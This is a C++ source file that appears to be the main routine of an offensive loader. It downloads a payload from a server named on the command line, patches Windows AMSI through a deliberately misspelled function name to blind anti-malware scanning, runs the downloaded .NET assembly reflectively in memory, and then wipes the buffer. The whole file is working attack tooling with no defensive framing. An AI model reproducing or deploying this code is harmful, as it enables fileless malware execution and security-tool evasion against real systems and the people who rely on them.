#include "ExecAssembly.h"
#include "Downloader.h"
#include "Utils.h"

unsigned char* rawData;
size_t rawDataLength;

int main(int argc, char ** argv)
{
    std::vector<BYTE> res;
    char** new_argv;

    // Download payload
    res = DoHttpDownload(CstrToLpwstr(argv[1]), CstrToLpwstr(argv[2]));
    rawData = &res[0];
    rawDataLength = res.size();

    //Patch AMSI
    PatchAhEhmEssHeeScanBuffer();

    // Trigger reflective loading
    size_t tmplen;
    new_argv = (char **)malloc(sizeof(char *) * (argc - 3));
    for (int i = 0; i < (argc - 3); i++)
    {
        tmplen = strlen(argv[i + 3]);
        new_argv[i] = (char *)malloc(tmplen + 1);
        memset(new_argv[i], 0, tmplen + 1);
        drunk_strcpy(new_argv[i], argv[i + 3]);
    }
    DoReflectiveAssembly(argc - 3, new_argv);
    memset(rawData, 0, rawDataLength);

    return (0);
}
